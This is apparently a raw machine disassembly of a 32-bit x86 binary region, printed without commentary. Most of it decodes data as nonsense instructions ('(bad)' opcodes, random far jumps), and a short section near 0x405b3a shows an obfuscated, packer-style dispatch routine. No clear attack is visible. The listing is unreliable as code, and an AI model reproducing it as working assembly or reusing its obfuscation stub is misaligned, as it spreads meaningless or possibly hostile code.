  405986:	lock clc 
  405988:	addr16 inc esi
  40598a:	fdivr  st,st(2)
  40598c:	fidivr DWORD PTR [edi-0x2fe910c]
  405992:	adc    eax,0xb6c5ecc2
  405997:	jnp    0x40599f
  405999:	in     eax,0x5
  40599b:	push   ss
  40599c:	lock xchg BYTE PTR [ebp+0xb460092],bl
  4059a3:	mov    al,cs:0xa42163cf
  4059a9:	add    al,0xb6
  4059ab:	test   BYTE PTR [edx+0x4557e648],ch
  4059b1:	int    0x4
  4059b3:	mov    bh,0xf
  4059b5:	add    al,0xd1
  4059b7:	mov    esi,0x2dd5b879
  4059bc:	repz or eax,0x20099271
  4059c2:	adc    dh,BYTE PTR [edi+0x39504ebb]
  4059c8:	push   ebp
  4059c9:	xchg   edi,eax
  4059ca:	mov    edx,0xd49cf9f3
  4059cf:	retf   
  4059d0:	xlat   BYTE PTR ds:[ebx]
  4059d1:	aaa    
  4059d2:	mov    ds:0x15bd814d,al
  4059d7:	mov    ecx,DWORD PTR ds:[ebx]
  4059da:	mov    ah,0xf4
  4059dc:	outs   dx,DWORD PTR ds:[esi]
  4059dd:	outs   dx,DWORD PTR ds:[esi]
  4059de:	add    eax,0x1147c320
  4059e3:	test   ebx,ebx
  4059e5:	loopne 0x405a46
  4059e7:	ja     0x4059cd
  4059e9:	data16 cmc 
  4059eb:	mov    ds:0x689d4b0b,al
  4059f0:	scas   eax,DWORD PTR es:[edi]
  4059f1:	in     al,0x87
  4059f3:	lea    eax,[eax+ebx*4]
  4059f6:	jecxz  0x405a1a
  4059f8:	sbb    al,BYTE PTR [edi+0xa]
  4059fb:	inc    ebp
  4059fc:	push   0x77
  4059fe:	mov    ebp,0x9434a0fa
  405a03:	mov    WORD PTR [esi-0x32],gs
  405a06:	fcomp  QWORD PTR [ebx]
  405a08:	sar    ch,0xf2
  405a0b:	out    0xef,al
  405a0d:	imul   edx,DWORD PTR [esi+0xa],0xffffffe0
  405a11:	adc    BYTE PTR [edi+0x4537d583],ah
  405a17:	test   eax,0x9770e3ea
  405a1c:	push   esp
  405a1d:	mov    bh,BYTE PTR [ebx+ecx*2]
  405a20:	push   esp
  405a21:	push   esp
  405a22:	clc    
  405a23:	jmp    0xa8d08c6f
  405a28:	enter  0xc13c,0xdb
  405a2c:	cmp    DWORD PTR [ecx+edi*4-0x6c],edi
  405a30:	sar    DWORD PTR [ebp+ecx*8+0x47f88bd0],0x4a
  405a38:	into   
  405a39:	clc    
  405a3a:	lock cld 
  405a3c:	pop    esi
  405a3d:	adc    BYTE PTR [edi+eiz*1+0x6e3227c],al
  405a44:	mov    dh,dh
  405a46:	mov    ah,0x46
  405a48:	push   edx
  405a49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a4a:	push   0xd24f1187
  405a4f:	sbb    ecx,DWORD PTR [ecx]
  405a51:	repnz mov eax,0x4917d157
  405a57:	shl    DWORD PTR [ecx],cl
  405a59:	and    ch,0x5c
  405a5c:	adc    BYTE PTR [ebp-0x6a575d20],cl
  405a62:	mov    cl,BYTE PTR [edx+eax*1]
  405a65:	ins    DWORD PTR es:[edi],dx
  405a66:	ret    
  405a67:	push   0x2d
  405a69:	(bad)  
  405a6a:	mov    ds:0x12a5ab63,al
  405a6f:	gs push esi
  405a71:	call   0xfb12214d
  405a76:	add    BYTE PTR [ecx+0x7db8e664],cl
  405a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a7d:	sbb    eax,0xa47491bf
  405a82:	cwde   
  405a83:	enter  0xd8c8,0x30
  405a87:	xor    BYTE PTR [esi],bl
  405a89:	jae    0x405a46
  405a8b:	mov    ebx,DWORD PTR [edi-0x3e2c494a]
  405a91:	mov    ecx,0xbce0583b
  405a96:	push   ebx
  405a97:	jp     0x405a75
  405a99:	or     al,0xff
  405a9b:	push   edx
  405a9c:	cmp    edx,DWORD PTR ds:0xa7eedf30
  405aa2:	scas   al,BYTE PTR es:[edi]
  405aa3:	(bad)  
  405aa4:	popf   
  405aa5:	xchg   ebx,eax
  405aa6:	add    al,BYTE PTR [eax-0x47]
  405aa9:	rol    BYTE PTR [edi+0x75],0xe0
  405aad:	and    BYTE PTR [ebx],dl
  405aaf:	mov    bh,0x85
  405ab1:	out    0xbe,eax
  405ab3:	ret    
  405ab4:	pop    edi
  405ab5:	and    esi,DWORD PTR [ecx-0x6b]
  405ab8:	pop    edx
  405ab9:	xor    DWORD PTR [ebx-0x3],ebx
  405abc:	jg     0x405b2e
  405abe:	jns    0x405afa
  405ac0:	xor    edi,DWORD PTR [ecx+edx*1-0x6961de72]
  405ac7:	cmp    DWORD PTR [esi-0xe],esp
  405aca:	ror    dh,cl
  405acc:	push   es
  405acd:	ja     0x405aa5
  405acf:	push   0x3a
  405ad1:	sub    al,cl
  405ad3:	movq   QWORD PTR [ebx-0x3e],mm1
  405ad7:	xor    ecx,DWORD PTR [edx+0x36]
  405ada:	adc    eax,0xede3930e
  405adf:	cdq    
  405ae0:	test   DWORD PTR [eax-0x47dbeef7],0x66dd7a8f
  405aea:	or     BYTE PTR [edi-0x4b1f3968],dl
  405af0:	adc    al,0xf1
  405af2:	inc    ebx
  405af3:	popa   
  405af4:	jle    0x405b5c
  405af6:	jmp    0x405aa9
  405af8:	data16 (bad) 
  405afa:	xor    al,0xa9
  405afc:	daa    
  405afd:	push   esi
  405afe:	test   BYTE PTR [eax],0xa3
  405b01:	cmc    
  405b02:	jbe    0x405b67
  405b04:	sar    BYTE PTR [ebx+ebx*4],1
  405b07:	pop    edi
  405b08:	mov    cs,ebx
  405b0a:	push   ds
  405b0b:	lds    eax,FWORD PTR [ecx+0x2d]
  405b0e:	xchg   ebx,eax
  405b0f:	ret    
  405b10:	sub    al,BYTE PTR [ebp-0x5e211547]
  405b16:	in     al,dx
  405b17:	adc    DWORD PTR [edi+edi*2-0x7c],0xffffffde
  405b1c:	lahf   
  405b1d:	pop    edx
  405b1e:	popf   
  405b1f:	fistp  DWORD PTR [ebx-0x25]
  405b22:	and    al,0xa0
  405b24:	pop    ss
  405b25:	xor    ebp,DWORD PTR [eax]
  405b27:	and    eax,0x84ac0d94
  405b2c:	addr16 jbe 0x405b4f
  405b2f:	inc    esp
  405b30:	adc    BYTE PTR [edi-0x77],ch
  405b33:	dec    ebp
  405b34:	adc    BYTE PTR [ecx+0xc6d],bh
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43379b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433753,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4337a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4337ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43382f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x6d3f1532
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405ba2
  405be0:	and    eax,0x421f379e
  405be5:	push   ebx
  405be6:	rol    BYTE PTR [edx],1
  405be8:	aad    0x6
  405bea:	mov    esi,0xff123898
  405bef:	imul   esi,DWORD PTR [edx+0xf],0x2f83d001
  405bf6:	repnz (bad) 
  405bf8:	fmul   st(3),st
  405bfa:	mov    ecx,0xa0228bcb
  405bff:	sti    
  405c00:	adc    ch,BYTE PTR [ecx]
  405c02:	stc    
  405c03:	adc    al,0xcc
  405c05:	and    eax,0xa4480a13
  405c0a:	sbb    eax,0x44b7bb
  405c0f:	mov    al,ds:0xf59b0008
  405c14:	fwait
  405c15:	sub    eax,0x2c9784ee
  405c1a:	jno    0x405ba5
  405c1c:	cmp    BYTE PTR [ecx-0x33],0x8e
  405c20:	repnz push ss
  405c22:	dec    ebx
  405c23:	mov    bl,0x18
  405c25:	jne    0x405c59
  405c27:	out    dx,eax
  405c28:	aaa    
  405c29:	xor    al,0x71
  405c2b:	pop    edi
  405c2c:	lahf   
  405c2d:	jns    0x405c8a
  405c2f:	xlat   BYTE PTR ds:[ebx]
  405c30:	dec    edx
  405c31:	js     0x405caa
  405c33:	mov    ecx,0x9a3cb495
  405c38:	mov    esp,0xb023c6fd
  405c3d:	adc    al,0x82
  405c3f:	and    cl,ch
  405c41:	scas   al,BYTE PTR es:[edi]
  405c42:	sbb    bh,BYTE PTR [ebp+0x706e61e0]
  405c48:	jbe    0x405bd5
  405c4a:	pop    edx
  405c4b:	ret    0xd29f
  405c4e:	sbb    DWORD PTR [edi-0x49],esi
  405c51:	sar    esp,0x24
  405c54:	mov    ds:0xd2001582,al
  405c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c5a:	out    0xc5,eax
  405c5c:	addr16 xchg ebp,eax
  405c5e:	adc    eax,0x44249c9a
  405c63:	outs   dx,BYTE PTR ds:[esi]
  405c64:	hlt    
  405c65:	repnz aad 0xff
  405c68:	mov    BYTE PTR [edi],bh
  405c6a:	ret    0xa1e5
  405c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c6e:	pushf  
  405c6f:	fnsave [edx+edi*1]
  405c72:	push   esp
  405c73:	outs   dx,BYTE PTR ds:[esi]
  405c74:	push   ebx
  405c75:	mov    ?,WORD PTR [esp+eax*8]
  405c78:	call   0xb88d:0xdc84f461
  405c7f:	cs inc ebx
  405c81:	ja     0x405c32
  405c83:	div    BYTE PTR [esp+ebx*4-0xf]
  405c87:	cmc    
  405c88:	imul   esi,DWORD PTR [ebp+0x70],0xa2706741
  405c8f:	gs xor al,0x94
  405c92:	outs   dx,BYTE PTR ds:[esi]
  405c93:	mov    DWORD PTR [ecx],ecx
  405c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c96:	das    
  405c97:	enter  0x45ef,0x7f
  405c9b:	out    dx,eax
  405c9c:	stos   BYTE PTR es:[edi],al
  405c9d:	pop    ebp
  405c9e:	dec    ecx
  405c9f:	mov    edi,0xd4e5789b
  405ca4:	sbb    eax,0x80560479
  405ca9:	dec    ebp
  405caa:	js     0x405c8d
  405cac:	cld    
  405cad:	mov    ebp,0x4df994da
  405cb2:	jmp    0x405c99
  405cb4:	sub    al,0x49
  405cb6:	sbb    BYTE PTR [edi+0x31ee313b],cl
  405cbc:	in     al,0x82
  405cbe:	sub    ecx,eax
  405cc0:	rcl    DWORD PTR [ecx+0xe546a82],1
  405cc6:	or     eax,0x51e153af
  405ccb:	xor    al,0x2d
  405ccd:	jnp    0x405c76
  405ccf:	adc    al,0x9d
  405cd1:	push   ebp
  405cd2:	cmp    dh,BYTE PTR [ecx+0x6cabb817]
  405cd8:	inc    ecx
  405cd9:	xchg   DWORD PTR [esi+eax*2+0x73c2c6ab],esp
  405ce0:	js     0x405cc7
  405ce2:	jns    0x405ce5
  405ce4:	mov    al,ds:0x6efb66fc
  405ce9:	cmp    ch,BYTE PTR ds:0x3086019c
  405cef:	adc    cl,BYTE PTR [esi]
  405cf1:	inc    ebp
  405cf2:	jne    0x405c8d
  405cf4:	mov    eax,0xf680440
  405cf9:	pop    es
  405cfa:	sahf   
  405cfb:	cld    
  405cfc:	inc    esp
  405cfd:	inc    esp
  405cfe:	xchg   ebx,eax
  405cff:	idiv   DWORD PTR cs:[esi]
  405d02:	outs   dx,BYTE PTR ds:[esi]
  405d03:	pop    esp
  405d04:	and    DWORD PTR [edi],ebp
  405d06:	mov    WORD PTR [ecx+0x280b79ec],gs
  405d0c:	mov    eax,ds:0xa46d510b
  405d11:	jp     0x405ce7
  405d13:	in     al,0xe6
  405d15:	js     0x405cce
  405d17:	xor    al,0xd3
  405d19:	test   DWORD PTR [edi],esp
  405d1b:	stos   BYTE PTR es:[di],al
  405d1d:	ret    
  405d1e:	mov    ds:0x4ea6e854,al
  405d23:	ins    DWORD PTR es:[edi],dx
  405d24:	je     0x405d06
  405d26:	sbb    al,BYTE PTR [ebp+0x55a880b4]
  405d2c:	pusha  
  405d2d:	mov    ch,0xf9
  405d2f:	popf   
  405d30:	inc    esi
  405d31:	fsubr  st(4),st
  405d33:	inc    eax
  405d34:	mov    eax,ds:0x3ccb92f6
  405d39:	sti    
  405d3a:	icebp  
  405d3b:	imul   ecx,DWORD PTR [ebp+0x7c],0xf
  405d3f:	cmp    BYTE PTR [ebp-0x2e582c3c],ch
  405d45:	mov    ah,0x99
  405d47:	xor    al,0x78
  405d49:	(bad)  [ebx]
  405d4b:	push   ss
  405d4c:	push   eax
  405d4d:	push   edx
  405d4e:	mov    gs,WORD PTR [edx+0x18b43752]
  405d54:	sbb    al,BYTE PTR ds:[ecx]
  405d57:	pop    ecx
  405d58:	lahf   
  405d59:	popf   
  405d5a:	xchg   BYTE PTR [ebx+0x13d6a37c],ch
  405d60:	pop    es
  405d61:	mov    edi,0x2edee720
  405d66:	sub    ah,dh
  405d68:	pop    esp
  405d69:	in     eax,0x40
  405d6b:	fs push esi
  405d6d:	inc    esi
  405d6e:	ins    DWORD PTR es:[edi],dx
  405d6f:	xchg   ebx,eax
  405d70:	sbb    eax,0x17b347f3
  405d75:	pop    es
  405d76:	jmp    0x5972:0xfefb0231
  405d7d:	inc    ebx
  405d7e:	sub    eax,0x7cb5bc8e
  405d83:	jns    0x405d82
  405d85:	pop    es
  405d86:	repz adc BYTE PTR [eax],0x50
  405d8a:	test   al,0x86
  405d8c:	pop    edi
  405d8d:	pop    esi
  405d8e:	sub    ch,ch
  405d90:	(bad)
  405d93:	lahf   
  405d94:	push   eax
  405d95:	pop    ss
  405d96:	xor    dh,ah
  405d98:	add    dl,BYTE PTR [edx+0x36a5c3af]
  405d9e:	mov    eax,ds:0x8969d28c
  405da3:	dec    eax
  405da4:	push   esp
  405da5:	add    BYTE PTR [eax-0x7e],bh
  405da8:	jmp    0x72c4eb01
  405dad:	js     0x405df3
  405daf:	in     al,0x80
  405db1:	mov    ds,WORD PTR [eax+0x22e9dfb8]
  405db7:	outs   dx,DWORD PTR ds:[esi]
  405db8:	out    dx,al
  405db9:	pop    edx
  405dba:	pop    esi
  405dbb:	js     0x405de4
  405dbd:	mov    al,0x59
  405dbf:	outs   dx,BYTE PTR ds:[esi]
  405dc0:	mov    bl,0x81
  405dc2:	repnz pop ebx
  405dc4:	in     eax,dx
  405dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dc6:	mov    bl,bl
  405dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dc9:	fwait
  405dca:	popf   
  405dcb:	sub    ebx,DWORD PTR [edi-0x37]
  405dce:	cmp    ah,BYTE PTR [edi-0x3ea511a]
  405dd4:	sbb    ecx,esp
  405dd6:	xor    eax,0x78352e48
  405ddb:	(bad)
  405de0:	int    0x42
  405de2:	push   ss
  405de3:	pop    esi
  405de4:	dec    ebp
  405de5:	imul   ebx,DWORD PTR [ebp+ecx*4+0x4e],0xcfa68875
  405ded:	pop    esi
  405dee:	aam    0xb8
  405df0:	mov    ch,0x62
  405df2:	and    edx,DWORD PTR [edx+eiz*8+0x4d]
  405df6:	jg     0x405dd4
  405df8:	test   al,0xe5
  405dfa:	cmp    ecx,0x69
  405dfd:	loopne 0x405da5
  405dff:	in     al,dx
  405e00:	popf   
  405e01:	mov    al,ds:0xd14b79f4
  405e06:	xor    bl,al
  405e08:	jge    0x405d9e
  405e0a:	shl    DWORD PTR [esi],0xb
  405e0d:	mov    eax,ds:0xbcd8290c
  405e12:	lea    ebx,[edi+eax*8-0x35729689]
  405e19:	jg     0x405dee
  405e1b:	mov    ah,0x13
  405e1d:	inc    esi
  405e1e:	mov    al,ds:0xdb82455c
  405e23:	mov    WORD PTR [ebx+0x33],ss
  405e26:	pop    esi
  405e27:	in     eax,0xfd
  405e29:	out    dx,eax
  405e2a:	dec    eax
  405e2b:	fisttp DWORD PTR [esi-0x77]
  405e2e:	pop    ebx
  405e2f:	xchg   edi,eax
  405e30:	lock loop 0x405e9c
  405e33:	jno    0x405e65
  405e35:	retf   0x6ce8
  405e38:	sbb    DWORD PTR [edx-0x1b0cd3d],esp
  405e3e:	add    BYTE PTR ds:0x6b729596,al
  405e44:	push   ebp
  405e45:	mov    edx,0x1eae65e1
  405e4a:	xor    al,0xc9
  405e4c:	and    al,0xcb
  405e4e:	mov    WORD PTR [esi-0x19],?
  405e51:	fcmovb st,st(4)
  405e53:	sub    al,0x16
  405e55:	push   cs
  405e56:	cmp    eax,DWORD PTR [edi-0x39f22e21]
  405e5c:	imul   ebp,ebx,0xbf9b304d
  405e62:	inc    ecx
  405e63:	fst    QWORD PTR [ebx]
  405e65:	mov    cl,0x63
  405e67:	pop    eax
  405e68:	pushf  
  405e69:	and    bl,al
  405e6b:	(bad)  
  405e6c:	test   ch,al
  405e6e:	repz pop ds
  405e70:	stc    
  405e71:	sar    DWORD PTR [esi],0xc6
  405e74:	xchg   esp,eax
  405e75:	and    esp,eax
  405e77:	in     eax,0x7a
  405e79:	fistp  WORD PTR [edx+0x20]
  405e7c:	aas    
  405e7d:	xchg   DWORD PTR [esi-0x4c],edx
  405e80:	push   esp
  405e81:	cmp    ebp,DWORD PTR [edx]
  405e83:	retf   
  405e84:	sar    DWORD PTR [edi+0x7656db4c],0xf9
  405e8b:	inc    ebp
  405e8c:	mov    eax,0x2357192c
  405e91:	cmp    ah,BYTE PTR [ebx+0x26315e80]
  405e97:	add    al,0x80
  405e99:	les    ebp,FWORD PTR [esi+ebx*2+0x4c]
  405e9d:	inc    edx
  405e9e:	inc    edi
  405e9f:	fst    QWORD PTR [eax]
  405ea1:	pop    eax
  405ea2:	shr    DWORD PTR [edi-0x118961e9],cl
  405ea8:	pop    ebx
  405ea9:	lds    ebx,FWORD PTR fs:[edx]
  405eac:	pop    esp
  405ead:	mov    DWORD PTR [esi+0x7e],ebp
  405eb0:	inc    ebp
  405eb1:	mov    edi,0x9d91f376
  405eb6:	xchg   edi,eax
  405eb7:	jno    0x405ec2
  405eb9:	push   esp
  405eba:	arpl   sp,bp
  405ebc:	inc    esp
  405ebd:	loopne 0x405eb3
  405ebf:	pushf  
  405ec0:	cmp    eax,0x78da66f1
  405ec5:	(bad)  cs:[edi]
  405ec8:	aas    
  405ec9:	jns    0x405f08
  405ecb:	mov    esp,0x6686c7b0
  405ed0:	mov    eax,ebx
  405ed2:	call   0x88bf:0x6afa3fde
  405ed9:	ins    WORD PTR es:[edi],dx
  405edb:	push   sp
  405edd:	jo     0x405e98
  405edf:	inc    ecx
  405ee0:	mov    dl,0x32
  405ee2:	adc    esp,ecx
  405ee4:	mov    eax,0x949d54fd
  405ee9:	stos   BYTE PTR es:[edi],al
  405eea:	int    0xb0
  405eec:	jnp    0x405f0a
  405eee:	ss xchg ecx,eax
  405ef0:	jmp    0x412519c7
  405ef5:	sub    eax,0x65bd9307
  405efa:	sub    al,0xa0
  405efc:	sub    BYTE PTR [ebx],ah
  405efe:	pusha  
  405eff:	mov    bl,0xd
  405f01:	popf   
  405f02:	inc    eax
  405f03:	mov    cs,ebp
  405f05:	aad    0x3d
  405f07:	cdq    
  405f08:	ret    
  405f09:	cmp    BYTE PTR [esi+0x23],bh
  405f0c:	xor    edx,edi
  405f0e:	fsubr  DWORD PTR [eax-0x80ecc92]
  405f14:	fldl2t 
  405f16:	dec    edx
  405f17:	add    eax,DWORD PTR [eax]
  405f19:	add    BYTE PTR [ebp-0x2e],dh
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [ecx+0x8],gs
  405f28:	cmp    al,0xfa
  405f2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	cmp    al,0xcc
  405f34:	(bad)  [eax+ebp*8+0x2f16a30e]
  405f3b:	or     bh,BYTE PTR ss:[esi-0x47]
  405f3f:	mov    ecx,DWORD PTR [ebx-0x3d]
  405f42:	mov    ecx,ebp
  405f44:	inc    ebp
  405f45:	and    DWORD PTR [ebp-0x79d4bff9],0xffffffab
  405f4c:	pushf  
  405f4d:	sub    DWORD PTR [esi],ebp
  405f4f:	xchg   edx,eax
  405f50:	test   esi,edx
  405f52:	and    al,0xe8
  405f54:	adc    dh,BYTE PTR gs:[ebp+0x5df55714]
  405f5b:	mov    eax,ds:0xf7917e66
  405f60:	xor    ebp,DWORD PTR [edx]
  405f62:	(bad)  
  405f63:	cdq    
  405f64:	mov    al,ds:0xd9dc357b
  405f69:	jge    0x405fd8
  405f6b:	jmp    0x566f9762
  405f70:	push   cs
  405f71:	std    
  405f72:	cmc    
  405f73:	dec    ebx
  405f74:	cmp    bh,BYTE PTR [ebp-0x15]
  405f77:	call   0x554b403e
  405f7c:	jmp    0x405f99
  405f7e:	cld    
  405f7f:	ins    DWORD PTR es:[edi],dx
  405f80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f81:	enter  0x1500,0x7e
  405f85:	pop    edi
  405f86:	icebp  
  405f87:	je     0x406004
  405f89:	jle    0x405f4c
  405f8b:	xchg   edi,eax
  405f8c:	cli    
  405f8d:	add    BYTE PTR [ecx],bl
  405f8f:	jle    0x405fc3
  405f91:	push   edi
  405f92:	xor    BYTE PTR [ecx],al
  405f94:	sbb    ah,dh
  405f96:	add    DWORD PTR [ebp-0x1627a52c],0x3a6526a9
  405fa0:	cmp    edx,DWORD PTR [eax]
  405fa2:	mov    DWORD PTR [ebx],ebx
  405fa4:	bound  edx,QWORD PTR ds:0x83412d51
  405faa:	mov    cs,ecx
  405fac:	add    dh,BYTE PTR [ebx]
  405fae:	fmul   DWORD PTR ds:0x69416f8
  405fb4:	std    
  405fb5:	stc    
  405fb6:	fbld   TBYTE PTR [eax+0x7b]
  405fb9:	fidiv  DWORD PTR [edx]
  405fbb:	clc    
  405fbc:	int3   
  405fbd:	push   eax
  405fbe:	cmp    esp,DWORD PTR ds:0xfd199161
  405fc4:	(bad)  
  405fc5:	cs cmc 
  405fc7:	fldenv fs:[edx-0x5baaf37a]
  405fce:	in     al,0x38
  405fd0:	mov    ds:0xe4383431,eax
  405fd5:	mov    ah,0x9c
  405fd7:	jp     0x406025
  405fd9:	or     DWORD PTR [eax-0x7f],edi
  405fdc:	pop    edx
  405fdd:	dec    ebp
  405fde:	rol    BYTE PTR [ecx+0x75388108],cl
  405fe4:	fstp   QWORD PTR [ebp-0x217c94e5]
  405fea:	jnp    0x406023
  405fec:	clc    
  405fed:	and    eax,0xb2f7d3d1
  405ff2:	mov    dl,0xf8
  405ff4:	and    ch,dh
  405ff6:	aad    0xb5
  405ff8:	push   eax
  405ffa:	mov    ?,WORD PTR [ebx+0x51208011]
  406000:	ins    DWORD PTR es:[edi],dx
  406001:	cmp    bl,BYTE PTR [edi+ebx*8+0x33]
  406005:	sar    ch,0x5d
  406008:	cs dec ebp
  40600a:	popa   
  40600b:	cdq    
  40600c:	xlat   BYTE PTR ds:[ebx]
  40600d:	xchg   esp,eax
  40600e:	push   eax
  40600f:	mov    esi,0xf222c67e
  406014:	loope  0x40608f
  406016:	sbb    BYTE PTR [ebp+ecx*8-0x4f],ch
  40601a:	sbb    al,al
  40601c:	test   eax,0x42b22758
  406021:	push   cs
  406022:	inc    eax
  406023:	mov    edx,0xeabf3f25
  406028:	push   es
  406029:	adc    eax,0xe8ca8dfe
  40602e:	mov    dh,0x32
  406030:	add    ecx,DWORD PTR [edi+0x15c7bf4a]
  406036:	jmp    0x540f:0xc5582260
  40603d:	adc    ebp,DWORD PTR [esi+0x4a]
  406040:	(bad)  
  406041:	sub    bl,BYTE PTR [esi]
  406043:	lea    ecx,[ecx+0x47]
  406046:	lea    esp,[eax-0x4e573991]
  40604c:	loopne 0x405fce
  40604e:	sub    eax,0xe0e79c89
  406053:	and    eax,0xb6898031
  406058:	pop    edi
  406059:	ror    BYTE PTR es:[di-0x44],1
  40605e:	aam    0x82
  406060:	fcom   QWORD PTR [ecx-0x2a]
  406063:	jge    0x406027
  406065:	fsub   DWORD PTR [ecx+0x5e258873]
  40606b:	repnz pop eax
  40606d:	jae    0x406055
  40606f:	rol    DWORD PTR [eax-0x77],cl
  406072:	xlat   BYTE PTR ds:[ebx]
  406073:	cmp    eax,0x64736329
  406078:	and    dh,BYTE PTR [ecx-0x20]
  40607b:	and    al,0x26
  40607d:	ins    BYTE PTR es:[edi],dx
  40607e:	xchg   esi,eax
  40607f:	test   BYTE PTR [ebx-0x3ad63cf7],0x0
  406086:	lds    esp,FWORD PTR [esi-0xddbd6a1]
  40608c:	dec    ecx
  40608d:	repz or dh,BYTE PTR [ebp+0x1c]
  406091:	jl     0x406021
  406093:	in     eax,0x43
  406095:	xchg   BYTE PTR [esi],bh
  406097:	add    al,0xc4
  406099:	iret   
  40609a:	xlat   BYTE PTR ds:[ebx]
  40609b:	addr16 das 
  40609d:	jo     0x40604a
  40609f:	arpl   WORD PTR [ebp+edx*8+0x54],sp
  4060a3:	dec    DWORD PTR [ebx]
  4060a5:	inc    esi
  4060a6:	bnd jo 0x406116
  4060a9:	loop   0x40606e
  4060ab:	bnd jae 0x4060d8
  4060ae:	mov    ds:0x81827346,eax
  4060b3:	lock mov eax,DWORD PTR [ebx-0x5a9a60d1]
  4060ba:	push   ecx
  4060bb:	cdq    
  4060bc:	cs out dx,al
  4060be:	sti    
  4060bf:	xchg   esp,eax
  4060c0:	and    eax,0x17933644
  4060c5:	(bad)  [ebp-0x72]
  4060c8:	mov    bl,0x50
  4060ca:	fidivr WORD PTR [eax-0x51]
  4060cd:	int3   
  4060ce:	add    DWORD PTR [edx-0x7ed57d24],ebp
  4060d4:	test   bh,bl
  4060d6:	(bad)  
  4060d7:	rcl    BYTE PTR ds:0xb29c5a8,1
  4060dd:	jno    0x4060b5
  4060df:	adc    eax,0x13387c50
  4060e4:	mov    ebx,0xc0024a54
  4060e9:	xor    eax,0xd2aa76ed
  4060ee:	jno    0x406092
  4060f0:	sub    ecx,DWORD PTR [ebp-0x50ad5b63]
  4060f6:	xor    al,al
  4060f8:	jno    0x406099
  4060fa:	xlat   BYTE PTR ds:[ebx]
  4060fb:	xchg   DWORD PTR [ecx+ecx*2-0x7d46b00b],ecx
  406102:	cmc    
  406103:	pop    ebx
  406104:	lds    ebx,FWORD PTR [ebp-0x449d55f6]
  40610a:	add    BYTE PTR [edi-0x4d8620c3],bl
  406110:	adc    ebp,ebp
  406112:	or     eax,0xf9d79d4a
  406117:	add    eax,0x1cb5df33
  40611c:	add    ebp,ecx
  40611e:	pushf  
  40611f:	jbe    0x4060e7
  406121:	aaa    
  406122:	scas   al,BYTE PTR es:[edi]
  406123:	mov    ds:0x1e1dc041,al
  406128:	stos   DWORD PTR es:[edi],eax
  406129:	mov    ds:0xbdb9975d,eax
  40612e:	rcl    DWORD PTR [edi-0x7ef8c447],1
  406134:	jo     0x40617e
  406136:	shl    BYTE PTR ds:0x265292aa,cl
  40613c:	sbb    dh,BYTE PTR [esi]
  40613e:	cli    
  40613f:	cmp    BYTE PTR [ecx],dh
  406141:	or     dl,al
  406143:	aaa    
  406144:	loopne 0x40611d
  406146:	or     ecx,edx
  406148:	sub    DWORD PTR [ebx+0x329c02d7],ebx
  40614e:	jge    0x406164
  406150:	sbb    BYTE PTR [ebp-0x41],ch
  406153:	xchg   edx,eax
  406154:	sub    dh,BYTE PTR [eax]
  406156:	fild   WORD PTR [edi+0x7ae72411]
  40615c:	aad    0xa5
  40615e:	lds    ecx,FWORD PTR ds:0xb9beb7ee
  406164:	int    0x5d
  406166:	scas   eax,DWORD PTR es:[edi]
  406167:	outs   dx,DWORD PTR ds:[esi]
  406168:	jo     0x406181
  40616a:	addr16 idiv ah
  40616d:	retf   
  40616e:	shl    DWORD PTR [ebx+0x6a5339a0],1
  406174:	pop    ebx
  406175:	test   al,0x4
  406177:	in     eax,0xef
  406179:	jp     0x4061bb
  40617b:	ror    DWORD PTR [ebp-0x24],0x6c
  40617f:	xchg   BYTE PTR [ebx+ebp*4+0x5e],al
  406183:	and    eax,0x6673f8ac
  406188:	int3   
  406189:	out    dx,al
  40618a:	sub    eax,0xc3dfcdc5
  40618f:	jecxz  0x4061f1
  406191:	adc    al,0x92
  406193:	je     0x406208
  406195:	mov    ebx,0x533e953f
  40619a:	fld    QWORD PTR [ecx+edi*4-0x5b20da6]
  4061a1:	call   0x8fe8:0x98c4b8d6
  4061a8:	cmp    edx,edx
  4061aa:	ja     0x406175
  4061ac:	lea    ecx,[edx]
  4061ae:	and    BYTE PTR [edi],dl
  4061b0:	mov    ds,WORD PTR [eax]
  4061b2:	push   0x70f345b6
  4061b7:	pop    ecx
  4061b8:	or     ebx,DWORD PTR [esi]
  4061ba:	nop
  4061bb:	sub    al,bl
